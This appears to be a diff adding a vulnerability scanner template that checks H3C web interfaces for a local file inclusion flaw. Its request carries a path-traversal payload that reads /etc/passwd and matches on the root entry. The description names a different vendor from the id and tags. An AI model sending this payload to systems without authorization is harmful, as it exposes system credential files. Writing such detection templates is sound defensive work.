@@ -1,0 +1,32 @@
+id: H3C-lfi
+
+info:
+  name: H3cLFI
+  author: momika233
+  severity: high
+  description: A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.
+  reference:
+    - https://www.github.com/momika233
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  tags: H3C,accent,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/03/02
